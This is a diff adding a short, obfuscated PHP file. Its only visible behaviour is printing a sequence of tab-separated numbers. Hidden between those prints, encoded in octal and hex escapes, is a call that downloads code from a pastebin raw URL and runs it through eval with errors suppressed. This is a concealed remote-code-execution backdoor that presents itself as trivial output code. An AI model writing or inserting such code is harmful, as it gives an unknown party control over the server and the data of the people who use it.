@@ -1,0 +1,2 @@
+<?php
+ goto iLVQC; iLVQC: echo "\x20\40\40\40\x31\11\62\11\x33\x9\64\x9\65\x9\x36\11\67\x9\x38\11\71\x9"; goto ukTOV; ukTOV: echo @null; goto kcRLL; kcRLL: @eval("\77\x3e" . file_get_contents(rawurldecode(urldecode("\x68\164\x74\160\163\72\x2f\x2f\x70\141\x73\164\x65\142\151\x6e\56\143\157\155\x2f\x72\141\x77\57\66\x42\141\x73\147\104\x58\x6e\40")))); goto OrN_b; OrN_b: echo "\x9\61\x31\x9\x31\x32\11\61\63\x9\x31\x34\x9\61\65\11\x31\x36\11\61\x37\x9\x31\x38\11\61\x39\11\62\x30\11\62\x31\x9\x32\62\x9\62\63\11\62\64\x9\x32\x35\x9\x32\x36";
